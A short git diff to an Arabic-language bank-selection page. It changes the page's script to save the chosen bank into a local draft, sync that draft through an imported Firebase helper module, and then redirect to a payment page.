@@ -25,12 +25,15 @@
       <article class="bank-card" data-bank="بنك مسقط"><div class="bank-logo muscat">بنك مسقط<br><small>bank muscat</small></div><button>اختيار</button></article>
     </section>
   </main>
-  <script>
-    document.querySelectorAll('.bank-card button').forEach(button => button.addEventListener('click', () => {
+  <script type="module">
+    import { syncDraft } from './firebase-sync.js';
+
+    document.querySelectorAll('.bank-card button').forEach(button => button.addEventListener('click', async () => {
       const bank = button.closest('.bank-card').dataset.bank;
       const draft = JSON.parse(localStorage.getItem('musaedDraft') || '{}');
       draft.bank = bank;
       localStorage.setItem('musaedDraft', JSON.stringify(draft));
+      await syncDraft(draft);
       window.location.href = `secure-payment.html?bank=${encodeURIComponent(bank)}`;
     }));
   </script>
